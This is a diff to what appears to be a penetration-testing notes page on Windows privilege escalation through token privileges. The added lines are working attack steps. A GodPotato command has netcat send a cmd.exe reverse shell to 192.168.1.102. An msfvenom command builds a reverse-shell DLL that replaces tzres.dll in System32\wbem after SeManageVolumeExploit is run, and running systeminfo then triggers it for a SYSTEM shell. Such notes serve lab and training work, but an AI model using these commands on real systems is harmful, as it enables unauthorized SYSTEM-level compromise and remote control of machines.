@@ -172,9 +172,38 @@ SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 
 ```
 
-SeImpersonatePrivilege
+### SeImpersonatePrivilege
 
-SeManageVolumePrivilege
+{% embed url="https://github.com/BeichenDream/GodPotato" %}
+
+```powershell
+.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+```
+
+### SeManageVolumePrivilege
+
+Running this exploit allows us RWX access to C:\ drive. We can create any PE or dll and execute it. To gain SYSTEM we can replace a dll with a malicious one.
+
+{% embed url="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public" %}
+
+Run exploit
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>C:\Users\svc_mssql> .\SeManageVolumeExploit.exe
+</strong></code></pre>
+
+#### Create malicious dll & replace it in C:\Windows\System32\wbem\\
+
+```shell-session
+$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.49.211 LPORT=6666 -f dll -o tzres.dll
+```
+
+#### Execute systeminfo (triggering malcious dll). We get a SYSTEM shell back to our listener.
+
+```powershell
+PS> systeminfo
+```
+
+
 
 SeDebugPrivilege
 
